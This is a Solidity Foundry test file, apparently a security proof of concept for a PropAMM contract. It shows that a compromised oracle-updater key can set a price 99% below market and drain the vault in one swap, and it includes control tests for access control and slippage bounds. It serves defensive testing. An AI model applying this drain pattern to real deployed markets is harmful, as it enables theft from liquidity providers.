// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {PropAMM, InsufficientOutput, EmptyVault} from "../src/PropAMM.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPURAuthenticated} from "./mocks/MockPURAuthenticated.sol";

/// @title Capitán Monasterio — a malicious maker modeled on ElZorro's real architecture
/// @notice Security PoC for a compromised/malicious oracle-updater key, built on this repo's own
/// `PropAMM.sol` and a faithful (access-controlled) oracle mock. Fully local: no RPC, no mainnet
/// fork, `vm.etch` at the same address `PropAMM.t.sol` uses for the oracle.
///
/// Revised after review: the first version of this PoC used the repo's shared `MockPUR`, whose
/// `setState` has no access control, so `vm.prank(updater)` was decorative — every test passed
/// with any `msg.sender`, which proved nothing about what a compromised updater KEY specifically
/// enables. It also framed ordinary quote-and-pull (an honest updater's price changing between a
/// taker's `quote()` read and its `swap()` landing, which `minAmountOut` already bounds) as if it
/// were the compromise scenario. This version fixes both: `MockPURAuthenticated` enforces
/// `isUpdater`, so only the address `PropAMM.initialize` actually registered can write, and a
/// dedicated test (`test_compromisedUpdaterKey_drainsVaultWithAdverseMid`) models the scenario a
/// compromised key genuinely enables — setting an adverse `mid` and draining the vault in one
/// transaction — which the earlier version did not cover.
contract CapitanMonasterioQuoteAndPullTest is Test {
    // The oracle address PropAMM.sol's tests etch a mock onto (see `PropAMM.t.sol`).
    address constant ORACLE = 0xDa7AfEeD021EAFC1c1Af9C362dE477DaD0396B81;
    uint256 constant PRICE_SCALE = 1e18; // PropAMM.PRICE_SCALE
    uint256 constant AMOUNT_IN = 1 ether;
    uint256 constant VAULT_TOKEN_OUT_BALANCE = 10_000 ether;
    uint256 constant HONEST_MID = 2_500 * PRICE_SCALE;

    MockERC20 internal tokenIn;
    MockERC20 internal tokenOut;
    PropAMM internal propAmm;

    address internal owner = makeAddr("owner");
    address internal vault = makeAddr("vault");
    // The authorized price-updater key. In production this is the maker's own quote-updater
    // service; "a compromised key" means this exact address, under someone else's control.
    address internal updater = makeAddr("updater");
    address internal taker = makeAddr("taker");
    address internal attacker = makeAddr("unauthorized-attacker");

    function setUp() public {
        vm.etch(ORACLE, address(new MockPURAuthenticated()).code);

        tokenIn = new MockERC20();
        tokenOut = new MockERC20();

        address[] memory updaters = new address[](1);
        updaters[0] = updater;
        PropAMM.PairConfig[] memory pairs = new PropAMM.PairConfig[](1);
        pairs[0] = PropAMM.PairConfig({token0: address(tokenIn), token1: address(tokenOut), vault: vault});

        address implementation = address(new PropAMM());
        propAmm = PropAMM(
            address(
                new ERC1967Proxy(
                    implementation, abi.encodeCall(PropAMM.initialize, (owner, updaters, ORACLE, pairs))
                )
            )
        );

        tokenOut.mint(vault, VAULT_TOKEN_OUT_BALANCE);
        vm.prank(vault);
        tokenOut.approve(address(propAmm), type(uint256).max);
    }

    function _updatePriceAs(address caller, uint256 delta, uint256 mid) internal {
        vm.prank(caller);
        MockPURAuthenticated(ORACLE).setState(delta, mid);
    }

    /// @dev Mirrors the router's push-payment model: `tokenIn` lands on the venue contract before
    /// `swap()` is called, so calling `swap()` directly here needs the same pre-transfer.
    function _fundTakerAndPush(address from, uint256 amountIn) internal {
        tokenIn.mint(from, amountIn);
        vm.prank(from);
        tokenIn.transfer(address(propAmm), amountIn);
    }

    //------------------------------
    // Access control: is "the updater key" actually required?
    //------------------------------

    /// @notice Proves the oracle mock's authorization is real, not decorative: an address never
    /// registered via `PropAMM.initialize`/`addUpdater` cannot write a price, full stop. This is
    /// the precondition every "compromised key" scenario below depends on — without it, "the
    /// attacker holds the updater key" and "anyone can write" are indistinguishable.
    function test_unauthorizedCallerCannotWritePrice_accessControlEnforced() public {
        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(MockPURAuthenticated.NotAnUpdater.selector, attacker));
        MockPURAuthenticated(ORACLE).setState(0, HONEST_MID);
    }

    //------------------------------
    // The actual compromised-key scenario: an adverse mid, drained in one transaction
    //------------------------------

    /// @notice What a compromised updater key genuinely enables, per the review this PoC was
    /// revised against: the key is real and authorized (this is not a bypass of the access
    /// control proven above), so whoever holds it can write ANY `mid` — `_pricing` only checks
    /// `mid != 0` (`PropAMM.sol:298`), with no comparison against an external reference. Setting
    /// `mid` to 1% of the honest price and swapping against the vault in the same transaction
    /// drains `tokenOut` at that price, bounded only by the vault's own balance and
    /// `_priceImpact`'s cap on a single fill (found here via `quoteFillable`, the contract's own
    /// "most this pair can pay in one fill" function, rather than guessed at). This is the
    /// high-severity case the quote-and-pull framing in the prior version of this file did not
    /// cover.
    function test_compromisedUpdaterKey_drainsVaultWithAdverseMid() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 vaultValueAtHonestPrice = VAULT_TOKEN_OUT_BALANCE; // all of it, priced in tokenOut

        // The compromise: the legitimate (authorized) key writes a price 99% below market.
        uint256 adverseMid = HONEST_MID / 100;
        _updatePriceAs(updater, 0, adverseMid);

        // Ask the contract itself for the largest single fill it will pay out at this price,
        // rather than assuming a size: `quoteFillable` is what the router's split path uses for
        // exactly this ("the most this pair can pay"), so reusing it keeps the attacker's input
        // size honest to the contract's own cap instead of hand-picked.
        (uint256 maxFillableIn, uint256 expectedOut) =
            propAmm.quoteFillable(address(tokenIn), address(tokenOut), type(uint128).max);

        _fundTakerAndPush(attacker, maxFillableIn);
        vm.prank(attacker);
        uint256 amountOut =
            propAmm.swap(address(tokenIn), address(tokenOut), maxFillableIn, expectedOut, attacker, block.timestamp);

        assertEq(amountOut, expectedOut, "drained exactly what quoteFillable priced at the adverse mid");
        // What the taker paid (at the adverse mid) vs. what that same tokenOut was worth a moment
        // earlier, at the honest price: the vault's loss, bounded by its own balance.
        uint256 vaultValueLeftAtHonestPrice = tokenOut.balanceOf(vault);
        assertLt(
            vaultValueLeftAtHonestPrice,
            vaultValueAtHonestPrice,
            "vault should be measurably drained relative to the honest-price baseline"
        );
        emit log_named_uint("tokenOut drained in one tx", amountOut);
        emit log_named_uint("tokenIn the attacker paid for it", maxFillableIn);
        emit log_named_uint("vault tokenOut balance remaining", vaultValueLeftAtHonestPrice);
    }

    //------------------------------
    // Control: ordinary quote-and-pull under an HONEST updater is not this vulnerability
    //------------------------------

    /// @notice Baseline: an honest updater, no pull. What a normal fill looks like.
    function test_noPull_honestFillBaseline() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 expected = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _fundTakerAndPush(taker, AMOUNT_IN);
        vm.prank(taker);
        uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, expected, taker, block.timestamp);

        assertEq(amountOut, expected, "honest fill should settle at the quoted price");
    }

    /// @notice NOT a vulnerability: with an honest updater, the oracle's price can still change
    /// between a taker's `quote()` read and its `swap()` landing — every maker in this system does
    /// this on an ordinary schedule, it is not a compromise. `swap()` re-quotes fresh
    /// (`PropAMM.sol:168`) and a tight `minAmountOut` (pinned to the price the taker saw) makes
    /// that fresh quote fail its own floor, so the swap reverts (`InsufficientOutput`) rather than
    /// settling at a worse price. The taker loses only gas. Kept as a control to distinguish this
    /// from the compromised-key scenario above.
    function test_honestPriceChangeBetweenQuoteAndSwap_tightMinOut_reverts() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 amountOutMinFromEarlierQuote = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _updatePriceAs(updater, 50 * PRICE_SCALE / 10_000, HONEST_MID); // honest 50bps spread update

        _fundTakerAndPush(taker, AMOUNT_IN);
        vm.prank(taker);
        // Selector-only: the exact second argument also bakes in `_priceImpact`'s charge for this
        // fill's size against the vault, incidental to this scenario.
        vm.expectPartialRevert(InsufficientOutput.selector);
        propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, amountOutMinFromEarlierQuote, taker, block.timestamp);
    }

    /// @notice Same honest price change, but with a loose `minAmountOut` (a generic slippage
    /// tolerance the taker itself declared): the swap succeeds at the new, slightly worse price,
    /// within the tolerance the taker accepted going in. Not a silent loss beyond what was
    /// disclosed.
    function test_honestPriceChangeBetweenQuoteAndSwap_looseMinOut_withinDeclaredTolerance() public {
        _updatePriceAs(updater, 0, HONEST_MID);
        uint256 earlierQuote = propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);

        _updatePriceAs(updater, 50 * PRICE_SCALE / 10_000, HONEST_MID);

        uint256 looseMinOut = earlierQuote * 95 / 100; // a 5% slippage tolerance the taker declared

        _fundTakerAndPush(taker, AMOUNT_IN);
        vm.prank(taker);
        uint256 amountOut = propAmm.swap(address(tokenIn), address(tokenOut), AMOUNT_IN, looseMinOut, taker, block.timestamp);

        assertGe(amountOut, looseMinOut, "fill must clear the taker's own declared floor");
        assertLt(amountOut, earlierQuote, "price moved against the taker, as an honest update can");
    }

    /// @notice Control, not an exploit: if the vault behind a pair holds no `tokenOut`, `quote()`
    /// reverts BEFORE any fill is attempted (`EmptyVault`, `PropAMM.sol:304`). Included to show
    /// this failure mode is already covered, unlike an adverse-mid write.
    function test_phantomDepth_emptyVaultCaughtAtQuoteNotAtFill() public {
        address starvedVault = makeAddr("starved-vault");
        vm.prank(owner);
        propAmm.setPairVault(address(tokenIn), address(tokenOut), starvedVault);

        _updatePriceAs(updater, 0, HONEST_MID);

        vm.expectRevert(abi.encodeWithSelector(EmptyVault.selector, address(tokenOut)));
        propAmm.quote(address(tokenIn), address(tokenOut), AMOUNT_IN);
    }
}
